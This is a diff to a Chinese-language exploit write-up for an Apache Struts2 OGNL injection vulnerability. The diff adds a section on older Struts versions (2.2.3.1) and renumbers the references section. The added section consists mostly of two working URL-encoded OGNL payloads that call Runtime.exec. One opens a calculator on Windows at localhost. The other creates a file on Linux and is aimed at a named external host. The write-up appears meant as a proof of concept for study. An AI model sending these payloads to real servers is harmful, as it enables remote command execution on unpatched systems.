@@ -125,7 +125,30 @@ ${
 #jas502n.close())
 }
 ```
-# 0x06 参考链接
+### 0x06 利用老版本弹计算器或命令执行
+
+漏洞环境：struts-2.2.3.1-all.zip 
+
+![](./struts-2.2.3.1.jpg)
+Ps： 坑就是低版本能弹计算器，高版本不能
+
+Windows:
+```
+http://127.0.0.1:8080/struts3-showcase/%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec('calc').getInputStream()%2c%23b%3dnew%20java.io.InputStreamReader(%23a)%2c%23c%3dnew %20java.io.BufferedReader(%23b)%2c%23d%3dnew%20char%5b51020%5d%2c%23c.read(%23d)%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23sbtest.println(%23d)%2c%23sbtest.close())%7d/actionChain1.action
+
+
+```
+![](./windows.png)
+
+Linux:
+```
+http://www.canyouseeme.cc/struts3-showcase/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27touch /tmp/jas502n%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action
+
+```
+![](./linux.png)
+
+
+# 0x07 参考链接
 
 ```
 https://github.com/vulhub/vulhub/tree/master/struts2/s2-048
